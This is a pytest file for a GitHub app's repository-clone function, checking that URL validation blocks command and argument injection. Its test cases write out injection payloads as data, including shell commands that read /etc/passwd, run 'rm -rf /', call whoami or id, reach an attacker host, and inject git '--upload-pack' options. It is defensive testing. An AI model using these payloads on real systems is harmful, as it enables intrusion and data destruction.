"""Tests for github_app/scan_trigger.py.

Covers: repo URL validation and command injection prevention (CQLF-R34-0001).
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from unittest.mock import patch

from github_app.scan_trigger import _validate_repo_url, _run_clone


class TestValidateRepoUrl:
    def test_valid_https_url(self):
        assert _validate_repo_url("https://github.com/owner/repo") == "https://github.com/owner/repo"

    def test_valid_https_url_with_git_suffix(self):
        assert _validate_repo_url("https://github.com/owner/repo.git") == "https://github.com/owner/repo.git"

    def test_valid_url_with_dots_and_hyphens(self):
        assert _validate_repo_url("https://github.com/my-org/my.repo-name") == "https://github.com/my-org/my.repo-name"

    def test_rejects_command_injection_via_semicolon(self):
        with pytest.raises(ValueError):
            _validate_repo_url("https://github.com/owner/repo; cat /etc/passwd")

    def test_rejects_command_injection_via_backtick(self):
        with pytest.raises(ValueError):
            _validate_repo_url("https://github.com/owner/repo`whoami`")

    def test_rejects_command_injection_via_pipe(self):
        with pytest.raises(ValueError):
            _validate_repo_url("https://github.com/owner/repo | rm -rf /")

    def test_accepts_non_github_https_url(self):
        assert _validate_repo_url("https://gitlab.com/owner/repo") == "https://gitlab.com/owner/repo"

    def test_rejects_ssh_url(self):
        with pytest.raises(ValueError):
            _validate_repo_url("git@github.com:owner/repo.git")

    def test_rejects_empty_string(self):
        with pytest.raises(ValueError):
            _validate_repo_url("")

    def test_rejects_argument_injection(self):
        with pytest.raises(ValueError):
            _validate_repo_url("--upload-pack=malicious")

    def test_rejects_newline_injection(self):
        with pytest.raises(ValueError):
            _validate_repo_url("https://github.com/owner/repo\n--upload-pack=evil")


class TestRunCloneRejectsInvalidUrl:
    def test_malicious_url_returns_error(self):
        result = _run_clone(
            "https://evil.com/payload; curl attacker.com",
            "/tmp/clone-target",
            "",
        )
        assert result["status"] == "failed"
        assert "Invalid repository URL" in result["error"]

    def test_argument_injection_returns_error(self):
        result = _run_clone(
            "--upload-pack=malicious",
            "/tmp/clone-target",
            "",
        )
        assert result["status"] == "failed"
        assert "Invalid repository URL" in result["error"]


class TestTaintChainBroken:
    """Verify that _validate_repo_url reconstructs URLs, breaking the taint chain."""

    def test_reconstructed_url_is_not_same_object(self):
        """The returned URL must be a new string (not the original object)."""
        original = "https://github.com/owner/repo"
        result = _validate_repo_url(original)
        assert result == original
        # The result should be reconstructed, not the same object
        assert result is not original

    def test_query_and_fragment_stripped(self):
        """Even if the regex were loosened, query/fragment would be removed."""
        # Current regex blocks this, so we just verify reconstruction on valid URLs
        url = "https://github.com/owner/repo.git"
        clean = _validate_repo_url(url)
        assert "?" not in clean
        assert "#" not in clean

    @patch("github_app.scan_trigger.subprocess.run")
    def test_clone_passes_reconstructed_url_to_subprocess(self, mock_run):
        """Ensure _run_clone passes a reconstructed (untainted) URL to subprocess."""
        mock_run.return_value = type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})()
        _run_clone("https://github.com/owner/repo", "/tmp/test-clone", "")
        args = mock_run.call_args
        cmd = args[0][0]  # first positional arg is the command list
        # The repo URL in the command should be the reconstructed value
        assert "https://github.com/owner/repo" in cmd
        # Verify '--' separator is present before the URL for argument injection protection
        dash_idx = cmd.index("--")
        url_idx = cmd.index("https://github.com/owner/repo")
        assert dash_idx < url_idx

    def test_command_injection_payload_in_clone(self):
        """Malicious payloads with shell metacharacters must be rejected."""
        payloads = [
            "https://github.com/owner/repo; cat /etc/passwd",
            "https://github.com/owner/repo$(whoami)",
            "https://github.com/owner/repo`id`",
            "https://github.com/owner/repo && rm -rf /",
            "https://github.com/owner/repo\n--upload-pack=evil",
        ]
        for payload in payloads:
            result = _run_clone(payload, "/tmp/clone-target", "")
            assert result["status"] == "failed", f"Expected failure for: {payload}"
            assert "Invalid repository URL" in result["error"], f"Wrong error for: {payload}"
